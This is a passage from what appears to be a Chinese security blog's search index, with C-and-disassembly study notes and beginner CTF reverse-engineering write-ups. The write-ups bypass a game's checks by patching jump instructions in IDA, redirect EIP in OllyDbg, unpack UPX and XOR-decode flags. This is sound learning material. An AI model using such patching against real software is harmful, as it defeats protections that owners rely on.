测试一下Python这是直接新建的：这样就可以一个vscode运行各种代码，对于不是专门做开发，只是写脚本的，就是个福音。","categories":[],"tags":[{"name":"vscode","slug":"vscode","permalink":"http://chumen77.xyz/tags/vscode/"}]},{"title":"C语言与反汇编学习（五）","slug":"C语言与反汇编学习（五）","date":"2019-11-12T12:18:49.000Z","updated":"2020-02-28T07:53:37.000Z","comments":true,"path":"2019/11/12/C语言与反汇编学习（五）/","link":"","permalink":"http://chumen77.xyz/2019/11/12/C语言与反汇编学习（五）/","excerpt":"","text":"C语言与反汇编学习（五）前言主要是记录一下，在学习过程中认为容易忘记且重要的东西，方便以后忘了再来学习一下。集中于结构体部分以及结构体对齐的知识。 结构体的使用练习1、定义一个结构体Gamer用来存储一个游戏中的角色的信息，包括血值、等级、坐标等信息 。要求： (1) 具体包含哪些信息自由设计 (2) 但这些包含的类型中，必须要有一个成员是结构体类型。 2、定义一个函数，用来给这个结构体变量赋值.3、定义一个函数，用来显示这个结构体变量的所有成员信息. #include #include &lt;stdio.h&gt; #include &lt;string.h&gt; struct point { int x; int y; int z; }; struct Gamer { char name[20]; int level; float HP; point a; }No1; void Function() { char a[]=”xiaozhi”; for (int i = 0; i &lt;strlen(a) ; ++i) { No1.name[i]=a[i]; } No1.level = 99; No1.HP = 99.9; No1.a.x=6; No1.a.y=5; No1.a.z=9; } void Display() { printf(“name:%s level:%d HP:%f point:%d %d %d “,No1.name,No1.level,No1.HP,No1.a.x,No1.a.y,No1.a.z); } int main() { Function(); Display(); return 0; } sizeof的使用基本类型的sizeof可以使用类型，也可以使用变量例子： printf(“%d\\n”,sizeof(char));printf(“%d\\n”,sizeof(int));printf(“%d\\n”,sizeof(float));printf(“%d\\n”,sizeof(double)); int x = 10; //变量printf(“%d\\n”,sizeof(x)); 数组类型的sizeof例子： char arr1[10] = {0}; short arr2[10] = {0}; int arr3[10] = {0}; printf(&quot;%d\\n&quot;,sizeof(arr1)); //10 printf(&quot;%d\\n&quot;,sizeof(arr2)); // 20 printf(&quot;%d\\n&quot;,sizeof(arr3)); // 40 printf(&quot;%d\\n&quot;,sizeof(arr1[10])); // 1 printf(&quot;%d\\n&quot;,sizeof(arr2[10])); // 2 printf(&quot;%d\\n&quot;,sizeof(arr3[10])); //4注意其中的不同。 结构体（内存）对齐为什么要有内存对齐？本质：是要效率还是空间，二选一的结果.统称是性能，还有台移植等因素，编译器对数据结构进行了内存对齐。 pragma pack的基本用法在vc6.0++中默认值是8字节对齐。 #pragma pack( n ) 结构体。 #pragma pack( )该操作会改变一个结构体的字节对齐数，这是针对编译器的。对齐参数：n为字节对齐数，其取值为1、2、4、8，默认是8。如果这个值比结构体成员的sizeof值小，那么该成员的偏移量应该以此值为准，即是说，结构体成员的偏移量应该取二者的最小值. #pragma pack(n) struct Test { int a ; __int64 b ; char c ; }; #pragma pack() 以下是各种情况的内存对齐分析:1:1字节对齐2:2字节对齐时：3：4个字节对齐4、8个字节对齐 对齐原则：原则一：数据成员对齐规则：结构的数据成员，第一个数据成员放在offset为0的地方，以后每个数据成员存储的起始位置要从该成员大小的整数倍开始(比如int在32位机为４字节，则要从4的整数倍地址开始存储). 原则二：结构体的总大小，也就是sizeof的结果，必须是其内部最大成员的整数倍，不足的要补齐。原则三：如果一个结构里有某些结构体成员，则结构体成员要从其内部最大元素大小的整数倍地址开始存储。 (struct a里存有struct b，b里有char，int，double等元素，那b应该从8的整数倍开始存储.) 原则四：对齐参数如果比结构体成员的sizeof值小，该成员的偏移量应该以此值为准. 也就是说，结构体成员的偏移量应该取二者的最小值. 由浅入深，分析内存对齐原则后内存到底是怎么分配的 案例分析一：struct Test { char a; int b ; }; sizeof(Test) =1+3（补齐的）+4=8(其中最大的4的整倍数) 案例二分析：struct Test { int a ; __int64 b ; char c ; }; sizeof(Test) =4+4（补齐的）+8+1+7（补齐的）=24(其中最大的8的整倍数) 案例三分析：struct Test { int a ; __int64 b ; char c ; char d ; }; sizeof(Test) =4+4（补齐的）+8+1+1+6（补齐的）=24(其中最大的8的整倍数) 案例四分析：struct S1 { char c; double i; }; sizeof(S1) =1+7（补齐的）+8=16(其中最大的8的整倍数) 案例五分析：struct S2 { int c1; char c2[10]; }; sizeof(S2) =4+10+2（补齐的）=16(其中最大的8的整倍数) 案例六分析：struct S3 { char c1; S1 s; char c2; char c3; }; sizeof(S3) =1+7+1（s中的char c）+7（补齐的）+8（s中的double）+1+1+6（补齐的）=32(其中最大的8的整倍数) 案例七分析：struct S4 { char c1; S1 s; char c2; double c3; }; sizeof(S4) =1+7+1（s中的char c）+7（补齐的）+8（s中的double）+1+7（补齐的）+8=40(其中最大的8的整倍数)","categories":[],"tags":[{"name":"c与汇编","slug":"c与汇编","permalink":"http://chumen77.xyz/tags/c与汇编/"}]},{"title":"Xctf\\_RE新手区WP","slug":"Xctfre_新手区wp","date":"2019-11-09T03:22:03.000Z","updated":"2020-02-28T07:55:24.000Z","comments":true,"path":"2019/11/09/Xctfre_新手区wp/","link":"","permalink":"http://chumen77.xyz/2019/11/09/Xctfre_新手区wp/","excerpt":"","text":"Xctf_RE新手区WP前言学c与反汇编学的有点疲倦了，且实际运用比较少，所以最近一周刷了很多的Re入门题，巩固知识且熟悉下ctf中的RE题目。 re1第一步，先查壳：（查壳很重要，可以先确认是否有壳还可以知道程序是什么语言编写的）看下程序是干嘛的，也就是你输入flag然后程序出个判断是否正确。估计就是个明文对比，直接od打开：断在了re模块。直接搜索字符串拿到flag game还是先查壳：无壳这道题有多种做法，下面展示三种： 第一种这个做法主要是判断程序逻辑，然后改关键跳转的汇编代码，进行爆破破解。先看下程序是做什么的：先输入个1发现图案中第1，2，8行图形发生了变化。接着输入2，然后第3，4，8行图形发生了变化。感觉没什么规律，大概猜一下，应该是这8行的线条全部连通就可以完成这个游戏。 打开IDA进行静态分析发现一堆函数难以找到主函数，按shift+F12查看字符串点击这个，查看一下这个字符串的交叉引用，然后可以双击跳转到main函数，看整个程序的逻辑。 跳转好后按F5查看伪代码：在下方发现了一个判断语句，满足后会调用sub_45Ab4这个函数。双击进入看看这个函数做了什么：发现会出现这个字符串，然后：还经过一堆数据和异或后返回一个字符串。那这个应该就是返回flag了。那就是想办法让程序调用sub_45Ab4这个函数就可以了。再看一下这个if语句里面正好是对一个容量为8的数组进行判断，对应刚刚程序中的8行，正好对应当8行直线全部连接（也可以认为是图案全变）就会调用输出flag的函数。 那现在需要做的就很明确的，直接改程序流程，IDA的patch是可以做到的，结合刚刚我们输入1的时候回让1，2，8行进行改变，那我们就在这几处做改变就可以了。 IDA Patch看主函数的流程图模式，专门找这个跳转指令JNZ，数一下8个就是刚刚的8个判断了。对应刚刚的想法我们在这几处的汇编代码进行patch：把JNZ改成正好相反的JZ 修改好后查看下生成的伪代码达到了我们想要的结果。然后我们需要把这些打patch的地方保存下来，让其成效：点击ok即可，可以为了安全选择一下做个bak备份。 验证输入1拿到了flag。 第二种这种主要是在IDA中静态分析后知道了，在程序调用输出flag函数后flag就打印出来了。就可以想办法在动态调试中直接调用这个函数就可以了。重在IDA和OD搭配使用了。 IDA寻找输出flag函数的函数地址记住这个0045E940 地址。下面OD直接想办法执行到该地址 OD动态调试发现基地址是010F在OD中搜索字符串，找一下我们应该在哪个地方找一个合适的可以控制的代码段。发现了输入n的语句地址。设置一个断点，运行程序。F9让程序运行到这里断下来。按空格修改下汇编代码jmp 0x010FE490 这时候的EIP，然后单步执行过来了，到了调用输出flag的函数。然后接下来会有很多循环和字符处理的操作，直接可以按CTRL+F8按键让OD自动执行。让把这个函数处理完，就会出现flag字符串。 这种修改EIP是重点和找到合适可控制代码段是重点，我们还可以在找到一个可以控制代码后，在搜索字符串中找到单击过去，然后在这个函数的开头设置为新的EIP然后按一下F8就来到了这个函数里面了。再进行刚刚的操作就可以了。 第三种这个就是我们找到了关键函数，分析以后是可以把这个函数是写出来的，然后根据伪代码写出原来的程序就可以了。 OD静态分析调用其函数。双击进入F5生成伪代码：（只是截取一部分）分析可以得知是分成了2个字符数组，一个V2到V58，一个V59到V115，都是56的长度，然后下面就是两个异或操作了。直接改成C代码，因为还不会写Python。 #include &lt;iostream&gt; #include &lt;string.h&gt; int main() { int i; char arr1[]={123,32,18,98,119,108,65,41,124,80,125,38,124,111,74,49,83,108,94,108,84,6,96,83,44,121,104,110,32,95,117,101,99,123,127,119,96,48,107,71,92,29,81,107,90,85,64,12,43,76,86,13,114,1,117,126,0}; char arr2[]={18,64,98,5,2,4,6,3,6,48,49,65,32,12,48,65,31,78,62,32,49,32,1,57,96,3,21,9,4,62,3,5,4,1,2,3,44,65,78,32,16,97,54,16,44,52,32,64,89,45,32,65,15,34,18,16,0}; for ( i = 0; i &lt; 56; ++i ) { arr1[i] ^= arr2[i]; arr1[i] ^= 0x13u; } printf(&quot;%s&quot;,arr1); return 0; }运行就拿到了flag。 Hello, CTF根据题目描述：菜鸡发现Flag似乎并不一定是明文比较的肯定是进行了某种加密。 先查壳无壳，32位c++程序 运行程序输入正确的serial，会提示正确。 IDA静态分析进入main函数，F5大法查看伪代码发现是v10数组与v13数组逐对比后，如果相同就会输出正确的字眼。前面有对用户输入的v9进行一些处理，处理完后会放入v10中。下面具体分析一下如何处理就可以了，主要在sprintf函数和strcat函数。点击进去看到那就很清楚了，就是把v4字符串也就是刚刚输入的字符串进行格式化位16进制的整数输出到v8中，然后用strcat函数把处理后的v8放入v10。（此处原来的v10是空的，所以连接v10和v8，实际相当于把v8放入v10） 接下来就是v10与v13进行对比，v13是刚刚复制过来的437261636b4d654a757374466f7246756e，那就可以看出来咱们直接把这个进行16进制转回去就可以了。 open-source这道题是拿到了一段c源码，打开发现关键处：可以看出来把first second strlen(argv[3])搞清楚是什么就可以了。很简单可以看出这3个是什么值，下面直接放解密代码： #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;iostream&gt; int main(int argc, char *argv[]) { unsigned int hash = 0xcafe * 31337 + (25 % 17) * 11 + strlen(&quot;h4cky0u&quot;) - 1615810207; printf(&quot;Get your key: &quot;); printf(&quot;%x\\n&quot;, hash); return 0; }拿到flag： simple-unpack分析这个看题目就是知道加了壳。且是个二进制文件，丢进edb看一下。 单步调试走一会，在寄存器窗口看到：这很明显是加了UPX壳。 脱壳这里就用upx -d直接一键脱壳。以后可以练习手动脱upx壳。脱壳完成后用IDA进行分析： IDA静态分析打开直接出现了flag，这个题就考个识别壳和upx脱壳了。 logmein先查看一下，无壳，elf 64位应用。 IDA静态分析点击此处出现了：确认关键代码段。开始对这个循环进行分析，需要对v8 v7 v9重点分析。这里面难点就在如何对v8的理解。 v8与关键加密分析v8是一个_int64也就是long long类型的数值，其存入内存需要变成16进制的数值存入。刚刚我们注意到这个x86框架x64的程序，其在内存是用小端序存入的，也就是地址高位放数值高位，地址低位放地址低位。那么其放好就是正好是反过来的。然后分析一下加密代码，这主要就是指针知识了：v4 = (unsigned int)(char)(*((_BYTE *)&amp;v8 + i % v7) ^ v9[i]);这里的（char）是给long long强制转型，然后为了后面的以2位16进制数也就是一个字节，来读取数值。i % v7其是就是控制i = 0—6正好把这个v8给正确读取完。然后一位位取完v8后开始跟v9异或。 脚本解密#include &lt;iostream&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; int main() { int v6; char v7[]=&quot;harambe&quot;; v6 = 7; char v8[18]; strcpy(v8, &quot;:\\&quot;AL_RT^L*.?+6/46&quot;); char s[18]; int i; for ( i = 0; i &lt; strlen(v8); ++i) { s[i] =v7[i%v6]^v8[i]; } for (int j = 0; j &lt; strlen(v8); ++j) { printf(&quot;%c&quot;,s[j]); } return 0; } 对于大小端序的知识补充数据类型为字节型( BYTE)时，其长度为1个字节,保存这样的数据时，无论采用大端序还是小端序，字节顺序都是一样的。但是数据长度为2个字节以上(含2个字节)时，采用不同字节序保存它们形成的存储顺序是不同的。采用大端序存储数据时，内存地址低位存储数据的高位，内存地址高位存储数据的低位，这是一种最直观的字节存储顺序;采用小端序存储数据时,地址高位存储数据的高位，地址低位存储数据的低位，这是一种逆序存储方式，保存的字节顺序被倒转，它是最符合人类思维的字节序。 强调：只有数据长度在2个字节以上时，即数据为多字节数据时，选用大端序还是小端序会导致数据的存储顺序不同。字符串“abcde” 被保存在一个字符 ( Char )数组str中,字符数组在内存中是连续的，此时向字符数组存放数据，无论采用大端序还是小端序，存储顺序都相同。 insanity这个没什么好说的，主函数点击一下他要打印的字符串就可以看到了flag，当然shift + f12也是可以看到。 no-strings-attachedcsaw2013reversing2getitpython-trademaze","categories":[],"tags":[{"name":"Re","slug":"Re","permalink":"http://chumen77.xyz/tags/Re/"},{"name":"WP","slug":"WP","permalink":"http://chumen77.xyz/tags/WP/"}]},{"title":"C语言与反汇编学习（四）","slug":"C语言与反汇编学习（四）","date":"2019-10-23T14:48:14.000Z","updated":"2020-02-28T07:53:42.000Z","comments":true,"path":"2019/10/23/C语言与反汇编学习（四）/","link":"","permalink":"http://chumen77.xyz/2019/10/23/C语言与反汇编学习（四）/","excerpt":"","text":"C语言与反汇编学习（四）前言本次主要学习以下内容 内存图 全局变量、局部变量 函数参数的分析 分支语句:if if...else... if..else if..else if....else分支语句的嵌套使用``的正向与逆向分析 内存图在电脑中任何一个程序运行时，其会在内存中分成以上图中的几个区域。详细每个区是怎么样的，直接看图即可。 全局变量、局部变量int g_n = 10; //全局变量 int Funcation() //代码区，调用时执行 { int x = 1;//局部变量 int y = 3; return g_n+x+y; } }就用这个代码段来分析。 全局变量的特点1、全局变量在程序编译完成后地址就已经确定下来了，只要程序启动，全局变量就已经存在了，启动后里面是否有值取决于声明时是否给定了初始值，如果没有，默认为0。2、全局变量的值可以被所有函数所修改，里面存储的是最后一次修改的值.3、全局变量所占内存会一直存在，知道整个进程结束.4、全局变量的反汇编识别：MOV 寄存器,byte/word/dword ptr ds:[0x12345678]通过寄存器的宽度，或者byte/word/dword 来判断全局变量的宽度.全局变量就是所谓的基址。 局部变量的特点1、局部变量在程序编译完成后并没有分配固定的地址.（因为计算机不知道什么时候会调用这个函数，所以不会提前分配好）2、在所属的方法没有被调用时，局部变量并不会分配内存地址，只有当所属的程序被调用了，才会在堆栈中分配内存.3、当局部变量所属的函数执行完毕后，局部变量所占用的内存将变成垃圾数据.局部变量消失.4、局部变量只能在函数内部使用，函数A无法使用函数B的局部变量.（从堆栈图中也可以想象的到原理）5、局部变量的反汇编识别：[ebp-4][ebp-8][ebp-0xC]等等类似的情形。 函数参数的分析如何判断函数有几个参数，已经分别是什么？ 一般情况： 步骤一：观察调用处的代码 push 3 push 2 push 1 call 0040100f 步骤二：找到平衡堆栈的代码继续论证 call 0040100f add esp,0Ch或者函数内部 ret 4/8/0xC/0x10最后，两者一综合，函数的参数个数基本确定.可以应对百分之八十的情况。 但剩下的百分之二十呢？上面的分析存在的问题：1、参数传递未必都是通过堆栈，还可能通过使用寄存器.例： push ebx push eax mov ecx,dword ptr ds:[esi] mov edx,dword ptr ds:[edi] push 45 push 33 call 函数地址2、函数调用处的代码无法查看.例：进入函数查看汇编代码： 00401050 push ebp 00401051 mov ebp,esp 00401053 sub esp,48h 00401056 push ebx 00401057 push esi 00401058 push edi 00401059 push ecx 0040105A lea edi,[ebp-48h] 0040105D mov ecx,12h 00401062 mov eax,0CCCCCCCCh 00401067 rep stos dword ptr [edi] 00401069 pop ecx 0040106A mov dword ptr [ebp-8],edx 0040106D mov dword ptr [ebp-4],ecx 00401070 mov eax,dword ptr [ebp-4] 00401073 add eax,dword ptr [ebp-8] 00401076 add eax,dword ptr [ebp+8] 00401079 mov [g_x (00427958)],eax 0040107E pop edi 0040107F pop esi 00401080 pop ebx 00401081 mov esp,ebp 00401083 pop ebp 00401084 ret 4 观察步骤：1、不考虑ebp、esp2、只找给别人赋值的寄存器eax/ecx/edx/ebx/esi/edi3、找到以后追查其来源，如果，该寄存器中的值，不是在函数内存赋值的，那一定是传进来的参数.**公式一：寄存器 + ret 4\\8\\0C = 参数个数公式二：寄存器 + [ebp+8]+[ebp+0x] = 参数个数**这两个公式可以互相结合验证看是否算的对。如以上代码段，只可以找到edi,ecx,edx给别人赋值，但是其中edi ecx都是函数内存赋的值，所以只剩下edx，在加上最后的ret 4（这个肯定是push进来了一个参数）就等于2，也就是2个参数。与公式二检验发现没问题，[ebp+0x]类似的只出现一个. 分支语句正向代码练习 练习1:定义4个int类型的全局变量，分别是g_x,g_y,g_z,g_r,使用if..else..分支语句，将最大的值存储到g_r中。 #include “stdafx.h” int g_x = 5; int g_y = 3; int g_z = 7; int g_r = 0; void getMax() { if(g_x&gt;g_y) { if (g_x&gt;g_z) { g_r=g_x; } else{ g_r=g_z; } } else if (g_y &gt; g_z) { g_r=g_y; } else g_r=g_z; printf(“%d\\n”,g_r); } int main(int argc, char* argv[]) { getMax(); return 0; } 练习2:找出数组里面最大的值，并存储到全局变量中 #include “stdafx.h” int a[4] = {2,5,7,9}; int g_r = 0; void getMax() { if(a[0]&gt;a[1]) { if (a[0]&gt;a[2]) { if (a[0]&gt;a[3]) { g_r=a[0]; } else g_r=a[3]; } else if(a[2]&gt;a[3]){ g_r=a[2]; } else g_r=a[3]; } else if (a[1] &gt; a[2]) { if (a[1]&gt;a[3]) { g_r=a[1]; } else g_r=a[3]; } else if (a[2] &gt; a[3]) { g_r=a[2]; } else g_r=a[3]; printf(“%d\\n”,g_r); } int main(int argc, char* argv[]) { getMax(); return 0; } 感悟1：分支语句中if else,及其相互套用，要知道当某个条件成功后，执行其中的代码，然后以后于它的代码都不会再进行判断和执行。2：一个if只对应于一个else，else只能在if后出现与其搭配使用。 逆向分析IF语句逆向分析特征识别:首先会有一个jxx指令用于向下跳转，且跳转的目的近end中没有jmp指令。根据以上特征，把jxx指令取反后，即可还原if语句的代码。（我们要知道jcc代码跳转语句，其判断条件正好跟c的if判断条件是正好反过来的。）汇编代码：对于这段代码我们采取一定的分析顺序来分析： 分析参数：[ebp+8] : X [ebp+0Ch] :Y 分析局部变量 无 分析全局变量 mov dword ptr 004225c4,ecx 功能分析:将参数X存到到EAX中，然后比较EAX,与参数Y的大小.如果X&lt;=Y 那么跳转到00401059的位置,否则，将X的值存储到全局变量中 返回值分析 无 练习： 分析参数：[ebp+8] : X [ebp+0Ch] :Y 分析局部变量 [ebp-4]：a 分析全局变量 mov eax,[004225c4]: m 功能分析:(省略，直接以c语言代码表示) 返回值分析 无 逆为c函数： int m=1; void Funcation(int x, int y) { int a; a=m; if(x&lt;=y) { y=y+a; m=y; } } IF…ELSE…语句逆向分析if..ees语句比if语句多出了-一个“else” ，当if表达式结果为真时跳过else分支语句块，当表达式结果为假时跳转到else 分支语句块中。特征识别:首先会有一个jxx指令用于向下跳转，且跳转的目的else中有的上方有jmp指令。else 代码的结尾没有jmp指令，else 的代码也会执行if _else. _end 的代码。根据以上特征，把jxx指令取反后，即可还原if…ese语句的代码总结：跳转执行一部分代码，不跳转执行另外一部分代码汇编代码：同样安装一定的顺序： 1：分析参数：[ebp+8] : X [ebp+0Ch] :Y2：分析局部变量 [ebp-4] = eax = [004225c4]3：分析全局变量 [004225c4] G4：功能分析:比较X与Y的大小，如果X&lt;=Y那么执行如果X&gt;Y 那么执行5：返回值分析 无练习： 分析参数：[ebp+8] : X [ebp+0Ch] :Y 分析局部变量 [ebp-4]：eax:[004225c4]:a [ebp-8]:b:2 分析全局变量 mov eax,[004225c4] 功能分析:(省略，直接以c语言代码表示) 返回值分析 无 还原成c函数： int m=1; void Funcation(int x,int y) { int a,b; a=m; b=2; if (x&gt;=y) { b=b+1; if (x&lt;y) { m=b; }else m=a+b; } } IF…ELSE IF…ELSE逆向分析特征识别:首先会有一个jxx指令用于向下跳转，且跳转的目的else if中有jmp指令。else if的跳转目的else中有jmp指令，且else码的结尾没有jmp指令，所有jmp的目标地址一致。根据以上特征，把jxx指令取反，即可还原if…else if….else语句的代码。如果某个分支没有条件判断，则为else部分。汇编代码： 函数内部功能分析： 1、分析参数：[ebp+8] X [ebp+0Ch] Y [ebp+10h] Z 2、分析局部变量 [ebp-4] = A = 0 [ebp-8] = B = 1 [ebp-0Ch] = C = 2 3、分析全局变量 无 4、功能分析 if(x&gt;y) { A = B+1; } else if(x&gt;z) { A = C+1; } else if(x&gt;z) { A = B+C } else { A = B+C+1; } return A; 练习：1、分析参数：[ebp+8] X [ebp+0Ch] Y [ebp+10h] Z 2、分析局部变量 [ebp-4] = A [ebp-8] = B [ebp-0Ch] = C 3、分析全局变量 无 4.返回值分析 a+1 还原成C函数： int Funcation(int x,int y,int z) { int a=0; int b=1; int c=2; if (x&lt;=y) { a=b-1; } else if (y&gt;=z) { a=c+1; } else if (x&gt;z) { a=b+c; } else a=b+c-1; return a+1; } 感悟每个分支类型都有自己的特征点，记清楚这个后，分析起来会容易很多。","categories":[],"tags":[{"name":"c与汇编","slug":"c与汇编","permalink":"http://chumen77.xyz/tags/c与汇编/"}]},{"title":"C语言与反汇编学习（三）","slug":"C语言学习与反汇编（三）","date":"2019-10-20T15:45:40.000Z","updated":"2020-02-28T07:53:44.000Z","comments":true,"path":"2019/10/20/C语言学习与反汇编（三）/","link":"","permalink":"http://chumen77.xyz/2019/10/20/C语言学习与反汇编（三）/","excerpt":"","text":"C语言与反汇编学习（三）前言本次主要学习一下C语言的数据类型与数据存储。 数据类型 学习数据类型的三个要素1、存储数据的宽度2、存储数据的格式3、作用范围(作用域)这些都是谈起一个数据类型的基本要素。 整数类型：char short int long char 8BIT 1字节 short 16BIT 2字节 int 32BIT 4字节 long 32BIT 4字节 char i = 0xFF; short x =0xFF; long y =0xFF;我们来看下在汇编其是什么样的：注意byte word dword的区别。然后我们测试一下以下代码： char i = 0x12345678; short x = 0x12345678; long y = 0x12345678;然后看到还是byte word dword，并且也没有报错，但是我们运行以后可以看到这就说明你写了32位的数给char i这个8位的容器，这是允许的，但是只能装下8位，就从低位开始把78放入。 整数类型分为有符号(signed)和无符号(unsigned)两种： char i = 0xFF; unsigned char i = 0xFF;要知道其在内存里存着显示的都是FF但是输出打印出来一个是255 一个是-1，这就是说明在内存中存储的方式完全一样，但会根据你的定义来确实其是有符号还是无符号。其默认是有符号的，当你想用无符号的时候需要你来定义。并且这个只有在类型转换和大小比较中特别注意。因为你直接定义个无符号数，其在内存放的是和原来有符号数一样的，只是你在比较时编译器在编译的时候，会把其会把汇编代码跳转那里改成特定对应的JCC代码（只要针对无符号，因为默认是有符号的）。例子：无符号数比较，jcc是JBE，原来没有指定是无符号时，其是JLE（有符号）总结：1：在内存中存储的方式完全一样 。 2：在类型转换和大小比较中特别注意（运算）。 浮点类型：float doublefloat和double在存储方式上都是遵从IEEE的规范的float的存储方式如下图所示：double的存储方式如下图所示： 将一个float型转化为内存存储格式的步骤为: 先将这个实数的绝对值化为二进制格式 将这个二进制格式实数的小数点左移或右移n位，直到小数点移动到第一个有 效数字的右边。 从小数点右边第一一位开始数出二十三位数字放入第22到第0位。 如果实数是正的，则在第31位放入“0”，否则放入“1”。 如果n是左移得到的，说明指数是正的，第30位放入“1”。如果n是右移得到的或n=0，则第30位放入“0”。 如果n是左移得到的，则将n减去1后化为二进制，并在左边加“0”补足七位，放入第29到第23位。 如果n是右移得到的或n=0，则将n化为二进制后在左边加“0’补足七位，再各位求反，再放入第29到第23位。 这是官方解释。有点麻烦。先练习一个：8.25转成浮点存储所以8.25用二进制表示可表示为1000.01，科学计数法表示一下：1.00001X2^3小数点向左移动3位 指数为3，然后按照上面先放第一个空格0（因为是正数），接着放最后一个大格子00001（科学计数法表示后从小数点后），然后中间格子第一位1（因为是左移小数点），指数3-1=2变成二进制10从右边开始放入。这就是IEEE规范。(可以感受到最麻烦就是中间这段的确定值)按四位分割0100 0001 0000 0100 0000 0000 0000 0000=41040000，然后就这样的形式存入计算机内存。 我下面用简单的且是正确的办法来转换：将float类型的12.5 转换成16进制：先整理正数部分，12=C=1100小数部分 0.5 * 2=1.0所以二进制就是1100.1，科学计数法 1.1001x2^3这次对中间格子是直接用127+x的结果 变成二进制填充这个格子，x的值就是指数，其中左移是正右移为负 double类型前面讲解了单精度浮点类型的IEEE编码。double类型和float类型大同小异，只是double类型表示的范围更大，占用空间更多，是float类型所占用空间的两倍。当然，精准度也会更高。 double类型占8字节的内存空间，同样，最高位也用于表示符号，指数位占11位，剩余42位用于表示位数。在float中，指数位范围用8位表示，加127后用于判断指数符号。在double中，由于扩大了精度，因此指数范围使用11位正数表示，加1023后可用于指数符号判断。 double类型的IEEE编码转换过程与float 类型一样，可根据float类型的转换流程来转换double类型。 英文字符存储char x = ‘A’;对于一个英文字符，编译器会自动查ASCII表获取其定义的7位二进制数，然后转换存储其16进制放入内存中。例：补充： 标准 ASCII 码使用 7 位二进制数来表示所有的大写和小写字母，数字 0 到 9、标点符号，以及在美式英语中使用的特殊控制字符。 ASCII 码使用指定的 7 位或 8 位二进制数组合来表示 128 或 256 种可能的字符。 扩展 ASCII 码允许将每个字符的第 8 位用于确定附加的 128 个特殊符号字符、外来语字母和图形符号。 为什么不是八位二进制呢？因为其第一位都是0，没必要记录，在起初7位已经满足需求。","categories":[],"tags":[{"name":"c与汇编","slug":"c与汇编","permalink":"http://chumen77.xyz/tags/c与汇编/"}]},{"title":"C语言与反汇编学习（二）","slug":"C语言与反汇编学习（二）","date":"2019-10-19T15:49:13.000Z","updated":"2020-02-28T07:53:46.000Z","comments":true,"path":"2019/10/19/C语言与反汇编学习（二）/","link":"","permalink":"http://chumen77.xyz/2019/10/19/C语言与反汇编学习（二）/","excerpt":"","text":"C语言与反汇编学习（二）前言本次主要学习一下c是如何变成汇编的，查找程序入口，调用约定，和主要练习使用__declspec(naked)裸函数实现部分简单的功能和完整的逆一个简单EXE成c语言。 裸函数什么是裸函数？void __declspec(naked) Function() {.....}在代码中申明函数后，编译时，除了入口参数压栈外，然后就是call这个函数，编译器不会为函数体生成任何代码。 运行裸函数为什么会出错以上的裸函数运行后，因为编译器除了入口参数压栈外，然后就是call这个函数，不会给其生成任何的汇编代码，所以明显运行后其无法回到原来的主函数，然后堆栈是不平衡的。所以： void __declspec(naked) Function() { __asm ret }加一个ret就好了，不会再报错了。 裸函数框架简单集合无参数无返回值的函数框架void __declspec(naked) Function() { __asm { push ebp mov ebp,esp sub esp,0x40 push ebx push esi push edi lea edi,dword ptr ds:[ebp-0x40] mov eax,0xCCCCCCCC mov ecx,0x10 rep stosd pop edi pop edi pop esi pop ebx mov esp,ebp mov esp,ebp ret } }有参数有返回值的函数框架void __declspec(naked) Function() { __asm { push ebp mov ebp,esp sub esp,0x40 push ebx push esi push edi lea edi,dword ptr ds:[ebp-0x40] mov eax,0xCCCCCCCC mov ecx,0x10 rep stosd //主要功能 mov eax,dword ptr ds:[ebp+8] add eax,dword ptr ds:[ebp+0xC] pop edi pop edi pop esi pop ebx mov esp,ebp mov esp,ebp ret } }带局部变量的函数框架void __declspec(naked) Function() { __asm { push ebp mov ebp,esp sub esp,0x40 push ebx push esi push edi lea edi,dword ptr ds:[ebp-0x40] mov eax,0xCCCCCCCC mov ecx,0x10 rep stosd //主要功能 mov dword ptr ds:[ebp-4],2 mov dword ptr ds:[ebp-8],3 mov eax,dword ptr ds:[ebp+8] add eax,dword ptr ds:[ebp+0xC] //注意汇编中局部变量的存放办法 pop edi pop edi pop esi pop ebx mov esp,ebp mov esp,ebp ret } }在练习中发现对局部变量在汇编中如何存放，如何体现有些生疏，特此记录一下。 针对裸函数的练习目标是要实现以下功能： int plus(int x,int y,int z) { int a = 2; int b = 3; int c = 4; return x+y+z+a+b+c; }代码： // Day2.cpp : Defines the entry point for the console application. // #include &quot;stdafx.h&quot; int __declspec(naked) plus(int x,int y,int z) { __asm { push ebp mov ebp,esp sub esp,0x40 //开栈 push ebx push esi push edi //保护现场 lea edi,dword ptr ds:[ebp-0x40] mov ecx,0x10 mov eax,0xCCCCCCCC rep stosd //为缓冲区填充数据 //真正要执行的功能 //局部变量：EBP—4开始 参数：ebp+8开始 //ebp+4是eip 原来call下条语句 mov eax,0x2 mov dword ptr ds:[ebp-0x4],eax mov eax,0x3 mov dword ptr ds:[ebp-0x8],eax mov eax,0x4 mov dword ptr ds:[ebp-0x0C],eax //放入局部变量 mov eax,dword ptr ds:[ebp+0x8] add eax,dword ptr ds:[ebp+0x0C] add eax,dword ptr ds:[ebp+0x10] add eax,dword ptr ds:[ebp-0x4] add eax,dword ptr ds:[ebp-0x8] add eax,dword ptr ds:[ebp-0x0C] mov dword ptr ds:[ebp-0x4],eax //把计算结果放入栈中，下面主函数打印a时要用到 pop edi; pop esi; pop ebx; mov esp,ebp pop ebp ret } } int main(int argc, char* argv[]) { int a; a=plus(6,7,8); printf(&quot;%d\\n&quot;,a); return 0; }练习这个可以更加熟悉堆栈结构，参数、局部变量的位置。 程序真正的入口main 或WinMain 是“语法规定的用户入口”，而不是“应用程序入口”。应用程序入口通常是启动函数。 在OD中默认设置就是到winmain入口就暂停程序，其并不是主函数入口。其实每一种编译器都有自己一套的编译标准，在主函数启动前要做一些必要的准备工作，下面我分析的是vc6.0的。 main 函数的识别与寻找只是vc++6.0main 函数被调用前要先调用的函数如下： GetVersion() _heap_init() GetCommandLineA() _crtGetEnvironmentStringsA() _setargv() _setenvp() _cinit() 这些函数调用结束后就会调用main 函数，根据main 函数调用的特征，将3个参数压入栈内作为函数的参数。所以在winmain停下后，可以一直单步调试，遇到call的时候，注意前方是不是有3个参数被压入栈了，是的话这个可以基本判断它call的就是main函数直接步过进去即可，但是这个也不是一定的，结合智能od的注释，注释有win内核函数调用就不要进入函数就可以了。 函数调用约定常见的几种约定： cdecl使用VC++ (关闭优化选项)编译代码生成cdecl.exe文件后，使用OllyDbg调试:函数的参数1、2以逆序方式压人栈，调用Plus(函数( 401014)后，使用ADD 